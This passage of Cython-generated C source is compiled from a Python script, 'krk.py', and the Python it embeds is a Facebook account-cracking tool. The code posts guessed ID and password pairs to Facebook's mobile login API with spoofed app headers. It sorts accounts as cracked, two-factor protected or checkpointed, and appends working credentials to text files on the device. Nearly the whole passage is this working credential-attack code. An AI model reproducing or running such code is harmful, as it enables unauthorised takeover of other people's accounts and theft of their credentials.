        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_source, __pyx_n_s_login) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_error_detail_type, __pyx_n_s_button_with_disabled) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_enroll_misauth, __pyx_n_s_false) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_session_cookies, __pyx_kp_s_1) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_generate_machine_id, __pyx_kp_s_1) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_meta_inf_fbmeta, __pyx_kp_s__52) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_currently_logged_in_userid, __pyx_kp_s_0) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_fb_api_req_friendly_name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 531, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "krk.py":548
 *                         }
 *                         headers={
 *                                 'Authorization':f'OAuth {accessToken}',             # <<<<<<<<<<<<<<
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Type':'unknown',
 */
        __pyx_t_5 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_accessToken, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_17 = __Pyx_PyUnicode_Concat(__pyx_kp_u_OAuth, __pyx_t_4); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_Authorization, __pyx_t_17) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Friendly_Name, __pyx_n_s_authenticate) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_Connection_Type, __pyx_n_s_unknown) < 0) __PYX_ERR(0, 548, __pyx_L3_error)

        /* "krk.py":551
 *                                 'X-FB-Friendly-Name':'authenticate',
 *                                 'X-FB-Connection-Type':'unknown',
 *                                 'User-Agent':ua,             # <<<<<<<<<<<<<<
 *                                 'Accept-Encoding':'gzip, deflate',
 *                                 'Content-Type': 'application/x-www-form-urlencoded',
 */
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_User_Agent, __pyx_v_ua) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Accept_Encoding, __pyx_kp_s_gzip_deflate) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_Content_Type, __pyx_kp_s_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_s_X_FB_HTTP_Engine, __pyx_n_s_Liger) < 0) __PYX_ERR(0, 548, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        /* "krk.py":556
 *                                 'X-FB-HTTP-Engine': 'Liger'
 *                                 }
 *                         url = 'https://b-api.facebook.com/method/auth.login'             # <<<<<<<<<<<<<<
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 */
        __Pyx_INCREF(__pyx_kp_s_https_b_api_facebook_com_method);
        __Pyx_XDECREF_SET(__pyx_v_url, __pyx_kp_s_https_b_api_facebook_com_method);

        /* "krk.py":557
 *                                 }
 *                         url = 'https://b-api.facebook.com/method/auth.login'
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'             # <<<<<<<<<<<<<<
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 */
        __pyx_t_5 = __Pyx_PyStr_Concat(__pyx_kp_s_Login_approval, __pyx_kp_s_s_are_on); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_17 = __Pyx_PyStr_ConcatInPlace(__pyx_t_5, __pyx_kp_s_Expect_an_SMS); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyStr_ConcatInPlace(__pyx_t_17, __pyx_kp_s_shortly_with); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyStr_ConcatInPlace(__pyx_t_5, __pyx_kp_s_a_code_to_use); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyStr_ConcatInPlace(__pyx_t_17, __pyx_kp_s_for_log_in); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 557, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_XDECREF_SET(__pyx_v_twf, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":558
 *                         url = 'https://b-api.facebook.com/method/auth.login'
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()             # <<<<<<<<<<<<<<
 *                         if 'session_key' in po:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 */
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_requests); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 558, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 558, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyTuple_New(1); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 558, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_v_url);
        __pyx_t_9 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 558, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 558, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_9, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 558, __pyx_L3_error)
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_17, __pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 558, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_json); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 558, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 558, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_po, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":559
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 */
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_session_key, __pyx_v_po, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 559, __pyx_L3_error)
        if (__pyx_t_23) {

          /* "krk.py":560
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 *                                         oks.append(ids)
 */
          __pyx_t_5 = PyNumber_Add(__pyx_kp_s_1_32m_ZEA_OK, __pyx_v_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 560, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_9 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__68); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 560, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = PyNumber_Add(__pyx_t_9, __pyx_v_pas); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 560, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_9 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 560, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 560, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "krk.py":561
 *                         if 'session_key' in po:
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                         oks.append(ids)
 *                                         break
 */
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 561, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 561, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_9 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 561, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __pyx_t_17 = PyNumber_Add(__pyx_t_9, __pyx_v_pas); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 561, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          __pyx_t_9 = PyNumber_Add(__pyx_t_17, __pyx_kp_s__63); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 561, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
          __pyx_t_17 = NULL;
          __pyx_t_10 = 0;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_17)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_17);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
              __pyx_t_10 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_17, __pyx_t_9};
            __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 561, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          }
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "krk.py":562
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 *                                         oks.append(ids)             # <<<<<<<<<<<<<<
 *                                         break
 *                         elif twf in str(po):
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_oks); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 562, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_24 = __Pyx_PyObject_Append(__pyx_t_5, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 562, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "krk.py":563
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 *                                         oks.append(ids)
 *                                         break             # <<<<<<<<<<<<<<
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:
 */
          goto __pyx_L18_break;

          /* "krk.py":559
 *                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
 *                         po = requests.post(url,data=data,headers=headers).json()
 *                         if 'session_key' in po:             # <<<<<<<<<<<<<<
 *                                         print('\r\r\033[1;32m [ZEA-OK] '+ids+' | '+pas+'\033[1;97m')
 *                                         open('/sdcard/ZEA-OK.txt','a').write(ids+'|'+pas+'\n')
 */
        }

        /* "krk.py":564
 *                                         oks.append(ids)
 *                                         break
 *                         elif twf in str(po):             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;33m[ZEA-2F] '+ids+' | '+pas)
 */
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_v_po); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 564, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_v_twf, __pyx_t_5, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 564, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        if (__pyx_t_23) {

          /* "krk.py":565
 *                                         break
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r \033[1;33m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)
 */
          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_pcp); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 565, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_y, __pyx_t_5, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 565, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (__pyx_t_23) {

            /* "krk.py":566
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;33m[ZEA-2F] '+ids+' | '+pas)             # <<<<<<<<<<<<<<
 *                                                 twf.append(ids)
 *                                                 break
 */
            __pyx_t_5 = PyNumber_Add(__pyx_kp_s_1_33m_ZEA_2F, __pyx_v_ids); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 566, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__68); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 566, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = PyNumber_Add(__pyx_t_6, __pyx_v_pas); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 566, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 566, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":567
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;33m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)             # <<<<<<<<<<<<<<
 *                                                 break
 *                         elif 'www.facebook.com' in po['error_msg']:
 */
            __pyx_t_24 = __Pyx_PyObject_Append(__pyx_v_twf, __pyx_v_ids); if (unlikely(__pyx_t_24 == ((int)-1))) __PYX_ERR(0, 567, __pyx_L3_error)

            /* "krk.py":568
 *                                                 print('\r\r \033[1;33m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)
 *                                                 break             # <<<<<<<<<<<<<<
 *                         elif 'www.facebook.com' in po['error_msg']:
 *                                         if 'y' in pcp:
 */
            goto __pyx_L18_break;

            /* "krk.py":565
 *                                         break
 *                         elif twf in str(po):
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r \033[1;33m[ZEA-2F] '+ids+' | '+pas)
 *                                                 twf.append(ids)
 */
          }

          /* "krk.py":564
 *                                         oks.append(ids)
 *                                         break
 *                         elif twf in str(po):             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r \033[1;33m[ZEA-2F] '+ids+' | '+pas)
 */
          goto __pyx_L19;
        }

        /* "krk.py":569
 *                                                 twf.append(ids)
 *                                                 break
 *                         elif 'www.facebook.com' in po['error_msg']:             # <<<<<<<<<<<<<<
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 */
        __pyx_t_6 = __Pyx_PyObject_Dict_GetItem(__pyx_v_po, __pyx_n_s_error_msg); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 569, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_6, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 569, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (__pyx_t_23) {

          /* "krk.py":570
 *                                                 break
 *                         elif 'www.facebook.com' in po['error_msg']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_pcp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 570, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_23 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_y, __pyx_t_6, Py_EQ)); if (unlikely((__pyx_t_23 < 0))) __PYX_ERR(0, 570, __pyx_L3_error)
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (__pyx_t_23) {

            /* "krk.py":571
 *                         elif 'www.facebook.com' in po['error_msg']:
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')             # <<<<<<<<<<<<<<
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 break
 */
            __pyx_t_6 = PyNumber_Add(__pyx_kp_s_1_36m_ZEA_CP, __pyx_v_ids); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 571, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_5 = PyNumber_Add(__pyx_t_6, __pyx_kp_s__68); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 571, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = PyNumber_Add(__pyx_t_5, __pyx_v_pas); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 571, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = PyNumber_Add(__pyx_t_6, __pyx_kp_s_1_97m); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 571, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 571, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":572
 *                                         if 'y' in pcp:
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                                 break
 *                                                 cps.append(ids)
 */
            __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 572, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_write); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 572, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 572, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_v_pas); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 572, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_kp_s__63); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 572, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __pyx_t_17 = NULL;
            __pyx_t_10 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
              __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_9);
              if (likely(__pyx_t_17)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                __Pyx_INCREF(__pyx_t_17);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_9, function);
                __pyx_t_10 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_17, __pyx_t_5};
              __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 1+__pyx_t_10);
              __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
              __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
              if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 572, __pyx_L3_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            }
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

            /* "krk.py":573
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 *                                                 break             # <<<<<<<<<<<<<<
 *                                                 cps.append(ids)
 *                                         else:
 */
            goto __pyx_L18_break;

            /* "krk.py":570
 *                                                 break
 *                         elif 'www.facebook.com' in po['error_msg']:
 *                                         if 'y' in pcp:             # <<<<<<<<<<<<<<
 *                                                 print('\r\r\x1b[1;36m [ZEA-CP] '+ids+' | '+pas+'\033[1;97m')
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')
 */
          }

          /* "krk.py":576
 *                                                 cps.append(ids)
 *                                         else:
 *                                                 open('/sdcard/ZEA-CP.txt','a').write(ids+'|'+pas+'\n')             # <<<<<<<<<<<<<<
 *                                                 break
 *                                                 cps.append(ids)
 */
          /*else*/ {
            __pyx_t_9 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__69, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 576, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_write); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 576, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __pyx_t_9 = PyNumber_Add(__pyx_v_ids, __pyx_kp_s__25); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 576, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_17 = PyNumber_Add(__pyx_t_9, __pyx_v_pas); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 576, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_17);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __pyx_t_9 = PyNumber_Add(__pyx_t_17, __pyx_kp_s__63); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 576, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
            __pyx_t_17 = NULL;
            __pyx_t_10 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
              __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_5);
              if (likely(__pyx_t_17)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_17);
